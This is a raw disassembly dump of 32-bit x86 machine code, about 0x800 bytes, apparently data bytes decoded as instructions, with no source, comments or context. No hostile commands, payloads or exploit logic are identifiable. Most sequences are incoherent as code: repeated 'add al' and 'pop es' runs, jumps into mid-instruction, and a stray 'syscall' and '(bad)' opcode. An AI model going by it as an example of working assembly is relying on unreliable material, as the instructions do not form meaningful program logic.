  4062fa:	je     0x406289
  4062fc:	add    eax,0x4da7434
  406301:	daa    
  406302:	je     0x4062db
  406304:	add    al,0x25
  406306:	je     0x4062ea
  406308:	add    al,0x31
  40630a:	je     0x4062f0
  40630c:	add    al,0x1f
  40630e:	je     0x4062c5
  406310:	add    al,0x35
  406312:	je     0x40633a
  406314:	add    eax,0x52f740a
  406319:	or     BYTE PTR [esi+esi*8+0x4],dh
  40631d:	and    BYTE PTR [ecx+esi*8+0x4],dh
  406321:	sbb    al,0x74
  406323:	push   cs
  406324:	add    eax,0x647746c
  406329:	pop    esp
  40632a:	je     0x406372
  40632c:	push   es
  40632d:	or     esi,DWORD PTR [edi+ecx*2+0x6]
  406331:	or     DWORD PTR [esi+esi*1+0x6],esi
  406335:	and    DWORD PTR [ecx+eax*2+0x6],esi
  406339:	sbb    eax,0x6d069e74
  40633e:	je     0x4062d7
  406340:	push   es
  406341:	pop    ebp
  406342:	add    BYTE PTR [eax],al
  406344:	add    BYTE PTR [eax],al
  406346:	add    BYTE PTR [ebx+ecx*4+0x5],dh
  40634a:	cmp    BYTE PTR [esp+ecx*8+0x4],dh
  40634e:	push   esi
  40634f:	je     0x406317
  406351:	add    al,0x28
  406353:	je     0x406324
  406355:	add    al,0x3b
  406357:	je     0x40631c
  406359:	add    al,0x12
  40635b:	je     0x406311
  40635d:	add    al,0x22
  40635f:	je     0x40632e
  406361:	add    al,0x66
  406363:	je     0x406381
  406365:	add    eax,0x5167457
  40636a:	sub    DWORD PTR [edx+eax*1-0x61],esi
  40636e:	add    eax,0x5a30161
  406373:	xchg   BYTE PTR [ecx],al
  406375:	xchg   edx,eax
  406376:	add    eax,0x58d0156
  40637b:	adc    al,BYTE PTR [ecx]
  40637d:	test   BYTE PTR ds:0x57e012f,al
  406383:	add    DWORD PTR cs:[ecx],ebp
  406386:	add    eax,0x5260375
  40638b:	fwait
  40638c:	add    esi,DWORD PTR ds:0x2e038b05
  406392:	add    eax,0x538038f
  406397:	mov    eax,0xb9053b03
  40639c:	add    ebx,DWORD PTR [edx]
  40639e:	add    eax,0x520038b
  4063a3:	mov    DWORD PTR [ebx],0x39d0514
  4063a9:	syscall 
  4063ab:	add    BYTE PTR [eax],al
  4063ad:	add    BYTE PTR [eax],al
  4063af:	add    BYTE PTR [edi+0x7404c903],bl
  4063b5:	add    eax,esi
  4063b7:	add    al,0x4a
  4063b9:	add    eax,ebp
  4063bb:	add    al,0x6a
  4063bd:	add    edi,DWORD PTR [esi-0x47fca1fc]
  4063c3:	add    al,0xbb
  4063c5:	add    edi,DWORD PTR [ebx-0x45fc57fc]
  4063cb:	add    al,0xaa
  4063cd:	add    esi,DWORD PTR [eax-0x5bfc99fc]
  4063d3:	add    al,0x4c
  4063d5:	add    ebx,DWORD PTR [edi+0x17034e04]
  4063db:	or     BYTE PTR [ebx+0x77074822],dl
  4063e1:	adc    cl,BYTE PTR [ebx+0x7]
  4063e4:	jno    0x4063f8
  4063e6:	dec    edx
  4063e7:	pop    es
  4063e8:	push   0x7a4d0012
  4063ed:	add    esi,DWORD PTR [eax]
  4063ef:	inc    esp
  4063f0:	jb     0x40644b
  4063f2:	xor    BYTE PTR [edi-0x79cfaf86],cl
  4063f8:	jb     0x40639d
  4063fa:	xor    BYTE PTR [ecx-0x7fcf5e86],al
  406400:	jb     0x4063a9
  406402:	xor    BYTE PTR [ebx-0x6dcf5a86],dl
  406408:	jb     0x4063b5
  40640a:	xor    BYTE PTR [ebp+0x7c30617a],al
  406410:	jb     0x406479
  406412:	xor    BYTE PTR [edi+0x0],dl
  406415:	add    BYTE PTR [eax],al
  406417:	add    BYTE PTR [eax],al
  406419:	jp     0x406480
  40641b:	xor    BYTE PTR [esi+0x72],cl
  40641e:	inc    ecx
  40641f:	xor    BYTE PTR [ecx+0x7a],bl
  406422:	pop    esi
  406423:	xor    BYTE PTR [eax+0x72],bl
  406426:	mov    al,ds:0xa67a3b30
  40642b:	xor    BYTE PTR [edx],bh
  40642d:	jb     0x4063d3
  40642f:	xor    BYTE PTR ds:0x3430aa7a,bh
  406435:	jb     0x4063df
  406437:	xor    BYTE PTR [edi-0x69cf5693],bl
  40643d:	ins    DWORD PTR es:[edi],dx
  40643e:	scas   eax,DWORD PTR es:[edi]
  40643f:	xor    BYTE PTR [ecx-0x6fcf5283],dl
  406445:	jge    0x4063da
  406447:	xor    BYTE PTR [ebx-0x7dcf6e93],al
  40644d:	ins    DWORD PTR es:[edi],dx
  40644e:	xchg   edi,eax
  40644f:	xor    BYTE PTR [ebp+0x7d],dh
  406452:	xchg   ebp,eax
  406453:	xor    BYTE PTR [ebp+edi*2-0x65],ch
  406457:	xor    BYTE PTR [edi+0x6d],ah
  40645a:	cdq    
  40645b:	xor    BYTE PTR [esi+0x6d],bl
  40645e:	lahf   
  40645f:	xor    BYTE PTR [ecx-0x57cf6283],ch
  406465:	jge    0x4064aa
  406467:	xor    BYTE PTR [eax],al
  406469:	push   cs
  40646a:	or     al,ah
  40646c:	xor    BYTE PTR [edi],cl
  40646e:	or     al,dh
  406470:	xor    al,ah
  406472:	or     eax,ecx
  406474:	xor    cl,dl
  406476:	or     edx,ecx
  406478:	xor    BYTE PTR [edx+0xa],dl
  40647b:	retf   
  40647c:	xor    BYTE PTR [eax],al
  40647e:	add    BYTE PTR [eax],al
  406480:	add    BYTE PTR [eax],al
  406482:	push   ebx
  406483:	or     cl,ah
  406485:	xor    BYTE PTR [edx+ecx*1-0x33],dl
  406489:	xor    BYTE PTR [ebp+0xa],dl
  40648c:	into   
  40648d:	xor    BYTE PTR [esi+0xa],al
  406490:	iret   
  406491:	xor    BYTE PTR [edi+0xa],al
  406494:	shl    BYTE PTR [eax],cl
  406496:	cwde   
  406497:	or     dl,ch
  406499:	xor    BYTE PTR [ecx-0x55cf27f6],cl
  40649f:	or     bl,bl
  4064a1:	xor    BYTE PTR [ebx-0x73cf21f6],cl
  4064a7:	or     bl,bh
  4064a9:	xor    BYTE PTR [ebp+0x5e30e00a],cl
  4064af:	or     ah,cl
  4064b1:	xor    BYTE PTR [edi+0xa],bl
  4064b4:	loop   0x4064e6
  4064b6:	nop
  4064b7:	or     ah,ah
  4064b9:	xor    BYTE PTR [ecx-0x1dcf19f6],al
  4064bf:	add    ebp,eax
  4064c1:	xor    bl,ah
  4064c3:	add    ebp,ecx
  4064c5:	xor    ah,al
  4064c7:	add    ebp,edx
  4064c9:	xor    ch,al
  4064cb:	add    ebp,ebx
  4064cd:	xor    dh,dl
  4064cf:	add    ebp,esp
  4064d1:	xor    bh,dl
  4064d3:	add    ebp,ebp
  4064d5:	xor    BYTE PTR [eax],cl
  4064d7:	add    al,0xef
  4064d9:	xor    cl,bh
  4064db:	add    esi,ebx
  4064dd:	xor    BYTE PTR [edx+0x1b309b03],bh
  4064e3:	add    al,0x9c
  4064e5:	xor    BYTE PTR [eax],al
  4064e7:	add    BYTE PTR [eax],al
  4064e9:	add    BYTE PTR [eax],al
  4064eb:	jne    0x4064b2
  4064ed:	pop    es
  4064ee:	or     al,0x73
  4064f0:	mov    al,0x7
  4064f2:	sbb    edi,DWORD PTR [ebx-0x3c]
  4064f5:	pop    es
  4064f6:	pop    ds
  4064f7:	jae    0x4064a3
  4064f9:	or     BYTE PTR [ecx],ah
  4064fb:	jnp    0x4064a4
  4064fd:	or     BYTE PTR [edx],ah
  4064ff:	jae    0x4064a9
  406501:	or     BYTE PTR [ebx],ah
  406503:	jnp    0x406532
  406505:	or     BYTE PTR [ebx+esi*2],ah
  406508:	or     BYTE PTR es:0x26082b7b,ah
  40650f:	jae    0x406535
  406511:	or     BYTE PTR [edi],ah
  406513:	jnp    0x406526
  406515:	or     BYTE PTR [eax],ch
  406517:	jae    0x40652b
  406519:	or     BYTE PTR [ecx],ch
  40651b:	jnp    0x40653c
  40651d:	or     BYTE PTR [edx],ch
  40651f:	jae    0x406541
  406521:	or     BYTE PTR [ebx],ch
  406523:	jnp    0x40653a
  406525:	or     BYTE PTR [ebx+esi*2],ch
  406528:	or     BYTE PTR cs:0x2e08237b,ch
  40652f:	jae    0x40652d
  406531:	pop    es
  406532:	das    
  406533:	jnp    0x40652e
  406535:	pop    es
  406536:	xor    BYTE PTR [ebx-0x6],dh
  406539:	pop    es
  40653a:	xor    DWORD PTR [ebx-0x9],edi
  40653d:	pop    es
  40653e:	xor    dh,BYTE PTR [ebx-0x8]
  406541:	pop    es
  406542:	xor    edi,DWORD PTR [ebx-0x63]
  406545:	pop    es
  406546:	xor    al,0x73
  406548:	xchg   esi,eax
  406549:	pop    es
  40654a:	xor    eax,0x36079b7b
  40654f:	add    BYTE PTR [eax],al
  406551:	add    BYTE PTR [eax],al
  406553:	add    BYTE PTR [ebx-0x6c],dh
  406556:	pop    es
  406557:	aaa    
  406558:	jnp    0x4064fb
  40655a:	pop    es
  40655b:	cmp    BYTE PTR [ebx-0x5e],dh
  40655e:	pop    es
  40655f:	cmp    DWORD PTR [ebx+0x6f],edi
  406562:	pop    es
  406563:	cmp    dh,BYTE PTR [ebx+0x49]
  406566:	pop    es
  406567:	inc    eax
  406568:	jnp    0x40656c
  40656a:	mov    BYTE PTR [edi],al
  40656c:	xor    al,0x4
  40656e:	mov    eax,DWORD PTR [edi]
  406570:	aaa    
  406571:	add    al,0x8a
  406573:	pop    es
  406574:	ss add al,0x85
  406577:	pop    es
  406578:	cmp    DWORD PTR [esp+ecx*4],eax
  40657b:	pop    es
  40657c:	xor    BYTE PTR [edi+eax*4],al
  40657f:	pop    es
  406580:	cmp    eax,DWORD PTR [esi+ecx*4]
  406583:	pop    es
  406584:	xor    al,BYTE PTR [ecx+eax*4]
  406587:	pop    es
  406588:	sub    eax,0x2c075004
  40658d:	add    al,0x53
  40658f:	pop    es
  406590:	aas    
  406591:	add    al,0x42
  406593:	pop    es
  406594:	ds add al,0x3d
  406597:	pop    es
  406598:	xor    DWORD PTR [esp+edx*2],eax
  40659b:	pop    es
  40659c:	sub    BYTE PTR [edi+ecx*2],al
  40659f:	pop    es
  4065a0:	ret    
  4065a1:	add    BYTE PTR [esi+0x7],al
  4065a4:	mov    edx,0xc5073900
  4065a9:	add    BYTE PTR [eax],bl
  4065ab:	pop    es
  4065ac:	les    eax,FWORD PTR [eax]
  4065ae:	sbb    eax,DWORD PTR [edi]
  4065b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b1:	add    BYTE PTR [eax+0x6],cl
  4065b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b5:	dec    BYTE PTR [edx+0x6]
  4065b8:	add    BYTE PTR [eax],al
  4065ba:	add    BYTE PTR [eax],al
  4065bc:	add    BYTE PTR [esi-0x5bf9b602],ah
  4065c2:	inc    BYTE PTR [esi+eax*1-0x37]
  4065c6:	dec    BYTE PTR [ebx+0x6]
  4065c9:	sar    dh,0x46
  4065cc:	push   es
  4065cd:	retf   
  4065ce:	dec    BYTE PTR [ebp-0x6f013dfb]
  4065d4:	add    eax,0x57ffead
  4065d9:	lods   al,BYTE PTR ds:[esi]
  4065da:	inc    BYTE PTR [edx-0x6e0160fb]
  4065e0:	add    eax,0x58cfe9e
  4065e5:	push   ecx
  4065e6:	(bad)  
  4065e7:	inc    DWORD PTR [ebx+0x7f047370]
  4065ed:	js     0x4065a7
  4065ef:	add    edx,DWORD PTR [esi+0x70]
  4065f2:	mov    ecx,0xf0785903
  4065f7:	and    BYTE PTR [eax+0x70],bl
  4065fa:	add    al,0x4
  4065fc:	pop    ebx
  4065fd:	js     0x406604
  4065ff:	add    al,0x3a
  406601:	jo     0x406606
  406603:	add    al,0x35
  406605:	js     0x406605
  406607:	add    edi,DWORD PTR [eax+esi*2]
  40660a:	inc    DWORD PTR [ebx]
  40660c:	aaa    
  40660d:	js     0x40660f
  40660f:	add    al,0x9e
  406611:	jo     0x406614
  406613:	add    al,0xa1
  406615:	js     0x406621
  406617:	add    al,0x90
  406619:	jo     0x406626
  40661b:	add    al,0x93
  40661d:	js     0x40662b
  40661f:	add    al,0x82
  406621:	add    BYTE PTR [eax],al
  406623:	add    BYTE PTR [eax],al
  406625:	add    BYTE PTR [eax+0xd],dh
  406628:	add    al,0x7d
  40662a:	js     0x406632
  40662c:	add    al,0x74
  40662e:	jo     0x4066a2
  406630:	add    al,0x6f
  406632:	js     0x40663c
  406634:	add    al,0x66
  406636:	jo     0x406641
  406638:	add    al,0x29
  40663a:	js     0x406604
  40663c:	add    ebp,DWORD PTR [eax]
  40663e:	jo     0x406652
  406640:	add    al,0x2b
  406642:	js     0x406657
  406644:	add    al,0x2a
  406646:	jo     0x406608
  406648:	add    esp,DWORD PTR ds:0x2c040e78
  40664e:	jo     0x40665f
  406650:	add    al,0x27
  406652:	js     0x406612
  406654:	add    ebp,DWORD PTR [esi-0x4efbea89]
  40665a:	ja     0x40661b
  40665c:	add    esp,DWORD PTR [eax-0x5cfbe589]
  406662:	ja     0x40667f
  406664:	add    al,0x0
  406666:	mov    DWORD PTR [ebx],0x420043a
  40666c:	cmp    eax,DWORD PTR [ecx+edx*1]
  40666f:	add    al,0x3c
  406671:	add    al,0x2
  406673:	add    al,0x3d
  406675:	add    al,0x23
  406677:	add    al,0x3e
  406679:	add    al,0xc
  40667b:	add    al,0x3f
  40667d:	add    al,0xd
  40667f:	add    al,0x4f
  406681:	add    al,0xfe
  406683:	add    eax,DWORD PTR [eax+0x4]
  406686:	fild   WORD PTR [ebx]
  406688:	inc    ecx
  406689:	add    al,0x0
  40668b:	add    BYTE PTR [eax],al
  40668d:	add    BYTE PTR [eax],al
  40668f:	or     BYTE PTR [edx+eax*2],al
  406692:	add    al,0x9
  406694:	add    al,0x43
  406696:	add    al,0xa
  406698:	add    al,0x36
  40669a:	add    al,0x5b
  40669c:	add    al,0x32
  40669e:	add    al,0x34
  4066a0:	add    al,0x4c
  4066a2:	add    al,0x45
  4066a4:	add    al,0x4b
  4066a6:	add    al,0x46
  4066a8:	add    al,0x37
  4066aa:	add    al,0x57
  4066ac:	add    al,0x48
  4066ae:	add    al,0x90
  4066b0:	add    al,0x4d
  4066b2:	add    al,0x81
  4066b4:	add    al,0x49
  4066b6:	add    al,0x72
  4066b8:	add    al,0x47
  4066ba:	add    al,0xb3
  4066bc:	add    al,0x4a
  4066be:	add    al,0x7c
  4066c0:	add    al,0x2e
  4066c2:	add    al,0x7d
  4066c4:	add    al,0x10
  4066c6:	add    al,0x6e
  4066c8:	add    al,0x11
  4066ca:	add    al,0x6f
  4066cc:	add    al,0x26
  4066ce:	add    al,0x78
  4066d0:	add    al,0x14
  4066d2:	add    al,0x79
  4066d4:	add    al,0x15
  4066d6:	add    al,0x7a
  4066d8:	add    al,0x24
  4066da:	add    al,0x2b
  4066dc:	add    dl,BYTE PTR [ebx]
  4066de:	add    al,0x24
  4066e0:	add    ah,BYTE PTR ds:0x1427504
  4066e6:	sbb    BYTE PTR [ecx+0x43],bh
  4066e9:	add    DWORD PTR [ecx],ebx
  4066eb:	jno    0x406721
  4066ed:	add    DWORD PTR [edx],ebx
  4066ef:	jns    0x406736
  4066f1:	add    DWORD PTR [ebx],ebx
  4066f3:	add    BYTE PTR [eax],al
  4066f5:	add    BYTE PTR [eax],al
  4066f7:	add    BYTE PTR [ecx+0x3e],dh
  4066fa:	add    DWORD PTR [ecx+edi*2],ebx
  4066fd:	xchg   edi,eax
  4066fe:	add    DWORD PTR ds:0x1e017071,ebx
  406704:	jns    0x40677f
  406706:	add    DWORD PTR [edi],ebx
  406708:	jno    0x406784
  40670a:	add    DWORD PTR [edi],ebp
  40670c:	jns    0x406789
  40670e:	add    DWORD PTR [eax],esp
  406710:	jno    0x4066ee
  406712:	add    BYTE PTR [ecx],ah
  406714:	jns    0x4066e3
  406716:	add    BYTE PTR [edx],ah
  406718:	jno    0x4066f0
  40671a:	add    BYTE PTR [ebx],ah
  40671c:	jns    0x4066ed
  40671e:	add    BYTE PTR [esi],dl
  406720:	jno    0x4066da
  406722:	add    BYTE PTR [edx],dl
  406724:	jns    0x406707
  406726:	add    BYTE PTR [ecx+esi*2],ch
  406729:	mov    dl,0x0
  40672b:	sub    edi,DWORD PTR [ecx-0x4d]
  40672e:	add    BYTE PTR [edi],dl
  406730:	jno    0x4066f6
  406732:	add    BYTE PTR [eax],ch
  406734:	jns    0x40674b
  406736:	add    DWORD PTR ds:0x29010e71,ebp
  40673c:	jns    0x406765
  40673e:	add    DWORD PTR [edi],esp
  406740:	jno    0x406762
  406742:	add    DWORD PTR [edx],ebp
  406744:	jns    0x406710
  406746:	add    DWORD PTR [esi-0x77fe348a],eax
  40674c:	jbe    0x40671a
  40674e:	add    DWORD PTR [ecx-0x75fe3a8a],ecx
  406754:	jbe    0x406714
  406756:	add    DWORD PTR [edx-0x73fe378a],ebp
  40675c:	add    BYTE PTR [eax],al
  40675e:	add    BYTE PTR [eax],al
  406760:	add    BYTE PTR [esi-0x3f],dh
  406763:	add    DWORD PTR [esi+0x1900276],ecx
  406769:	fiadd  WORD PTR [edx]
  40676b:	xchg   edx,eax
  40676c:	add    edx,edi
  40676e:	add    al,BYTE PTR [edi+0x7e02f801]
  406774:	add    DWORD PTR [eax+0x22],esp
  406777:	js     0x40677a
  406779:	and    DWORD PTR [ebx],eax
  40677b:	jnp    0x40677e
  40677d:	sbb    BYTE PTR [ebx],al
  40677f:	jp     0x406782
  406781:	adc    eax,DWORD PTR [ebx]
  406783:	jne    0x406786
  406785:	or     al,BYTE PTR [ebx]
  406787:	pop    esp
  406788:	add    DWORD PTR [edi-0x1afea8fe],edi
  40678e:	add    bl,BYTE PTR [esi+0x1]
  406791:	mov    cl,0x2
  406793:	push   ecx
  406794:	add    DWORD PTR [eax-0x41febffe],ebp
  40679a:	add    al,BYTE PTR [ebx+0x1]
  40679d:	in     eax,0x2
  40679f:	xor    al,BYTE PTR [ecx]
  4067a1:	mov    bl,0x2
  4067a3:	test   al,0x1
  4067a5:	add    al,0x3
  4067a7:	sub    eax,DWORD PTR [ecx]
  4067a9:	out    0x2,eax
  4067ab:	sub    al,BYTE PTR [ecx]
  4067ad:	out    0x2,al
  4067af:	sub    eax,0x2402e901
  4067b4:	add    eax,esp
  4067b6:	add    ch,BYTE PTR [edi]
  4067b8:	add    DWORD PTR [ebx],ecx
  4067ba:	add    ah,BYTE PTR [esi]
  4067bc:	add    DWORD PTR [edx],eax
  4067be:	add    ah,BYTE PTR [ecx]
  4067c0:	add    ebp,edi
  4067c2:	add    DWORD PTR [eax],esp
  4067c4:	add    DWORD PTR [eax],eax
  4067c6:	add    BYTE PTR [eax],al
  4067c8:	add    BYTE PTR [eax],al
  4067ca:	cld    
  4067cb:	add    DWORD PTR [ebx],esi
  4067cd:	add    edi,ebp
  4067cf:	add    DWORD PTR [edx],esi
  4067d1:	add    esi,ebp
  4067d3:	add    DWORD PTR ds:0x1c01e101,esp
  4067d9:	add    eax,ebx
  4067db:	add    DWORD PTR [edi],esi
  4067dd:	add    DWORD PTR [ebx],edx
  4067df:	add    ch,BYTE PTR [esi]
  4067e1:	add    DWORD PTR [edx],ecx
  4067e3:	add    al,BYTE PTR [eax]
  4067e5:	sbb    DWORD PTR [edx+eiz*4+0x3],esi
  4067e9:	sbb    BYTE PTR [ebx+eiz*4+0x3],dh
  4067ed:	mov    ebx,0xb503a175
  4067f2:	jne    0x406792
  4067f4:	add    edi,DWORD PTR [ebp+esi*2+0x75b7039f]
  4067fb:	pushf  
  4067fc:	add    ebx,DWORD PTR [esi-0x5efc628b]
  406802:	jne    0x4067ae
  406804:	add    edx,DWORD PTR [eax-0x37fc548b]
  40680a:	jne    0x40679f
  40680c:	add    ecx,DWORD PTR [ebx-0x75fc6f8b]
  406812:	jne    0x4067a5
  406814:	add    ecx,DWORD PTR [ebp-0x7bfc718b]
  40681a:	jne    0x4067ab
  40681c:	add    ecx,DWORD PTR [edi-0x79fc738b]
  406822:	jne    0x4067b1
  406824:	add    eax,DWORD PTR [ecx-0x7ffc658b]
  40682a:	jne    0x4067c7
  40682c:	add    edx,DWORD PTR [ebx+0x0]
  40682f:	add    BYTE PTR [eax],al
  406831:	add    BYTE PTR [eax],al
  406833:	jne    0x4067cd
  406835:	add    edx,DWORD PTR [edx+0x75]
  406838:	cdq    
  406839:	add    eax,DWORD PTR [ebp+0x75]
  40683c:	xchg   esi,eax
  40683d:	add    edi,DWORD PTR [esi*2+0x75570397]
  406844:	xchg   esp,eax
  406845:	add    ecx,DWORD PTR [esi+0x75]
  406848:	xchg   ebp,eax
  406849:	add    edi,DWORD PTR [ecx]
  40684b:	jne    0x40688f
  40684d:	add    edi,DWORD PTR [eax]
  40684f:	jne    0x406894
  406851:	add    ebx,DWORD PTR [ebx]
  406853:	jne    0x406896
  406855:	add    ebx,DWORD PTR [edx]
  406857:	jne    0x406899
  406859:	add    ebx,DWORD PTR ds:0x14033e75
  40685f:	jne    0x4068a0
  406861:	add    eax,DWORD PTR [eax]
  406863:	xor    dl,BYTE PTR [ebp-0x3b]
  406866:	add    esp,DWORD PTR [ebx]
  406868:	push   ebp
  406869:	mov    BYTE PTR [ebx],0x24
  40686c:	push   ebp
  40686d:	mov    DWORD PTR [ebx],0x3c85525
  406873:	std    
  406874:	add    eax,0x5fe23b7
  406879:	or     al,0x25
  40687b:	out    dx,eax
  40687c:	add    eax,0x5f02500
  406881:	and    BYTE PTR [ebx],ah
  406883:	add    DWORD PTR [esi],eax
  406885:	and    DWORD PTR [ebx],esp
  406887:	repnz add eax,0x5f32502
  40688d:	mov    eax,ds:0xa305f423
  406892:	and    esp,DWORD PTR ds:0x23a406
  406898:	add    BYTE PTR [eax],al
  40689a:	add    BYTE PTR [eax],al
  40689c:	es push es
  40689e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40689f:	and    esi,DWORD PTR [edi]
  4068a1:	push   es
  4068a2:	fwait
  4068a3:	and    edi,DWORD PTR [eax+0x6]
  4068a6:	popf   
  4068a7:	and    ecx,DWORD PTR [ecx+0x6]
  4068aa:	sahf   
  4068ab:	and    edi,DWORD PTR [edx]
  4068ad:	push   es
  4068ae:	mov    al,ds:0xa8063b23
  4068b3:	and    ebx,DWORD PTR [esi+eax*1-0x54]
  4068b7:	and    ebx,eax
  4068b9:	add    eax,0x5e92264
  4068be:	pusha  
  4068bf:	and    ch,dl
  4068c1:	add    eax,0x5eb2265
  4068c6:	sub    esp,DWORD PTR [edx]
  4068c8:	pushf  
  4068c9:	push   es
  4068ca:	xor    al,0x22
  4068cc:	popf   
  4068cd:	push   es
  4068ce:	sbb    eax,0x1e068e22
  4068d3:	and    dl,BYTE PTR [ecx-0x7bddf8fa]
  4068d9:	push   es
  4068da:	cmp    al,0x22
  4068dc:	test   DWORD PTR [esi],eax
  4068de:	inc    ebx
  4068df:	and    dh,BYTE PTR [ebp+0x1e]
  4068e2:	or     al,0xd4
  4068e4:	xchg   esp,eax
  4068e5:	repz or edx,edx
  4068e8:	push   esp
  4068e9:	or     al,0xc
  4068eb:	popa   
  4068ec:	push   edi
  4068ed:	jmp    0x4068fa
  4068ef:	sbb    dl,BYTE PTR [edi-0x11]
  4068f2:	or     eax,DWORD PTR [edx-0x7cf40fa9]
  4068f8:	push   edi
  4068f9:	cmp    eax,0x9657290b
  4068fe:	or     ebp,DWORD PTR [edx]
  406900:	add    BYTE PTR [eax],al
  406902:	add    BYTE PTR [eax],al
  406904:	add    BYTE PTR [edi-0x75],dl
  406907:	or     esp,DWORD PTR [edi]
  406909:	push   edi
  40690a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40690b:	or     ebp,DWORD PTR [eax]
  40690d:	xchg   edi,eax
  40690e:	sub    al,0xb
  406910:	add    dl,BYTE PTR [edi+0x74920b8b]
  406916:	nop
  406917:	or     edx,DWORD PTR [eax-0x6ef45a6c]
  40691d:	xchg   esp,eax
  40691e:	sahf   
  40691f:	or     edx,DWORD PTR [edx-0x6cf48c6c]
  406925:	xchg   esp,eax
  406926:	mov    WORD PTR [edx+eiz*1],cs
  406929:	xchg   ecx,eax
  40692a:	mov    DWORD PTR [esi+eax*8],ecx
  40692d:	pop    eax
  40692e:	mov    cl,BYTE PTR [edx+edx*4]
  406931:	push   eax
  406932:	xchg   DWORD PTR [ecx+ecx*1],ecx
  406935:	pop    ecx
  406936:	mov    BYTE PTR [esp+ecx*1],cl
  406939:	push   ecx
  40693a:	jge    0x406948
  40693c:	or     eax,0xa0bc659
  406941:	push   ecx
  406942:	mov    cl,0xb
  406944:	and    al,0x59
  406946:	ret    0xb0b
  406949:	push   ecx
  40694a:	mov    edi,0xb098180b
  40694f:	or     edx,DWORD PTR [eax]
  406951:	nop
  406952:	lds    ecx,FWORD PTR [ebx]
  406954:	or     al,0x98
  406956:	mov    esi,0x1390140b
  40695b:	or     al,0x3c
  40695d:	cwde   
  40695e:	add    dl,BYTE PTR [esi]
  406960:	or     al,0xf
  406962:	pop    ds
  406963:	sbb    DWORD PTR [esi+edi*8],ecx
  406966:	push   ds
  406967:	sbb    BYTE PTR [eax+eax*1],cl
  40696a:	add    BYTE PTR [eax],al
  40696c:	add    BYTE PTR [eax],al
  40696e:	jne    0x40698d
  406970:	sbb    ecx,DWORD PTR [ecx+esi*8]
  406973:	push   ds
  406974:	cli    
  406975:	or     ebp,eax
  406977:	push   ds
  406978:	cmc    
  406979:	or     eax,DWORD PTR [ecx+0x510bfc1d]
  40697f:	sbb    eax,0x1d490bf7
  406984:	fimul  WORD PTR [ebx]
  406986:	pop    ecx
  406987:	sbb    eax,0x1d770be1
  40698c:	mov    BYTE PTR [edx],cl
  40698e:	jbe    0x4069b2
  406990:	mov    ecx,DWORD PTR [edx]
  406992:	ja     0x4069b6
  406994:	mov    cl,BYTE PTR [edx]
  406996:	jno    0x4069ba
  406998:	test   DWORD PTR [edx],ecx
  40699a:	js     0x4069be
  40699c:	mov    WORD PTR [edx],cs
  40699e:	jb     0x4069c2
  4069a0:	xchg   DWORD PTR [edx],ecx
  4069a2:	jge    0x4069c6
  4069a4:	dec    esi
  4069a5:	or     bh,BYTE PTR [edx+eiz*1+0x51]
  4069a9:	or     ch,BYTE PTR [edi+0x22]
  4069ac:	inc    eax
  4069ad:	or     ah,BYTE PTR [ecx+0x22]
  4069b0:	inc    ebx
  4069b1:	or     al,BYTE PTR [esi+0x560a5522]
  4069b7:	push   ds
  4069b8:	dec    edi
  4069b9:	or     bl,BYTE PTR [ebx+0x22]
  4069bc:	inc    esi
  4069bd:	or     dl,BYTE PTR [eax+0x22]
  4069c0:	cmp    DWORD PTR [edx],ecx
  4069c2:	and    DWORD PTR es:[eax-0x64dedef6],ebx
  4069c9:	or     ch,BYTE PTR [eax]
  4069cb:	and    DWORD PTR [edx-0x6adedcf6],ebx
  4069d1:	or     al,BYTE PTR [eax]
  4069d3:	add    BYTE PTR [eax],al
  4069d5:	add    BYTE PTR [eax],al
  4069d7:	retf   0x7c23
  4069da:	or     cl,ch
  4069dc:	and    esi,DWORD PTR [edi+0xa]
  4069df:	mov    esp,0x6f7e0023
  4069e4:	lods   al,BYTE PTR ds:[esi]
  4069e5:	and    BYTE PTR [ecx+0x7f],dh
  4069e8:	pop    es
  4069e9:	and    DWORD PTR [edx+0x7f],esp
  4069ec:	hlt    
  4069ed:	pop    ds
  4069ee:	pop    ebp
  4069ef:	outs   dx,DWORD PTR ds:[esi]
  4069f0:	sbb    esp,DWORD PTR [ebx]
  4069f2:	push   esp
  4069f3:	outs   dx,DWORD PTR ds:[esi]
  4069f4:	and    BYTE PTR [eax],al
  4069f6:	dec    edi
  4069f7:	jg     0x406a15
  4069f9:	and    ebp,DWORD PTR [edx]
  4069fb:	jg     0x4069aa
  4069fd:	and    BYTE PTR ds:0x2c20ae6f,ah
  406a03:	outs   dx,DWORD PTR ds:[esi]
  406a04:	scas   eax,DWORD PTR es:[edi]
  406a05:	and    BYTE PTR [edi],ah
  406a07:	jg     0x4069b9
  406a09:	and    BYTE PTR [eax-0x4cdedb84],dh
  406a0f:	ins    BYTE PTR es:[edi],dx
  406a10:	cmc    
  406a11:	and    eax,0x25436ca5
  406a16:	pushf  
  406a17:	jl     0x4069b2
  406a19:	and    eax,0x253d7cb7
  406a1e:	scas   al,BYTE PTR es:[edi]
  406a1f:	ins    BYTE PTR es:[edi],dx
  406a20:	mov    eax,ds:0xea6c9925
  406a25:	pop    ds
  406a26:	cwde   
  406a27:	jl     0x406a14
  406a29:	pop    ds
  406a2a:	mov    ebx,0xba1fee7c
  406a2f:	ins    BYTE PTR es:[edi],dx
  406a30:	out    dx,eax
  406a31:	pop    ds
  406a32:	mov    ebp,0xb720f06c
  406a37:	jl     0x406a4d
  406a39:	and    BYTE PTR [esi+0x0],bl
  406a3f:	add    BYTE PTR [ebp+edx*1+0x20],bh
  406a43:	mov    al,ds:0x9226ef6c
  406a48:	ins    BYTE PTR es:[edi],dx
  406a49:	sahf   
  406a4a:	and    eax,0x25427c8d
  406a4f:	inc    esp
  406a50:	jl     0x4069ea
  406a52:	and    eax,0x25416c3f
  406a57:	ss ins BYTE PTR es:[edi],dx
  406a59:	mov    al,ds:0x687c4925
  406a5e:	and    eax,0xaafbbd00
  406a63:	and    eax,0x25acfbae
  406a68:	scas   eax,DWORD PTR es:[edi]
  406a69:	sti    
  406a6a:	mov    dl,0x25
  406a6c:	mov    eax,0x7925bcfb
  406a71:	sti    
  406a72:	add    eax,0x21fb7a26
  406a77:	and    BYTE PTR [ebx-0x5],ch
  406a7a:	test   eax,0xb1fb7425
  406a7f:	and    eax,0x25bbfb85
  406a84:	xchg   bl,bh
  406a86:	sbb    esp,DWORD PTR [esi]
  406a88:	ja     0x406a85
  406a8a:	sbb    eax,0x62fa1026
  406a8f:	and    DWORD PTR es:[eax+0x65],edx
